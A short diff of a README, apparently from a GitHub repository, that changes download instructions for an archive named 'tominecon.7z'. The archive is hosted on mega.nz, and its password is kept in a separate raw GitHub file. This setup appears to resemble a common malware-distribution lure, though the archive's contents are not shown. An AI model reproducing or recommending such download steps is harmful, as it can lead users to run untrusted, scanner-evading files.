@@ -5,7 +5,7 @@
   <p align="center">
    
   Download: [tominecon.7z](https://mega.nz/file/TjYhGDYR#rA0DEzVsJe5TTerlTgjpSsmPFUnIZJp4m4CxfkVGHYY)
-    
-   Winrar to open the file: [Winrar Download](https://www.win-rar.com/download.html?&L=0)
+  Password: [Click here](https://raw.githubusercontent.com/MrSPeeDy0/tominecon.7z/main/Password.txt)
+  WinRar : [Click here](https://www.win-rar.com/download.html?&L=0)
   </p>
 </p>
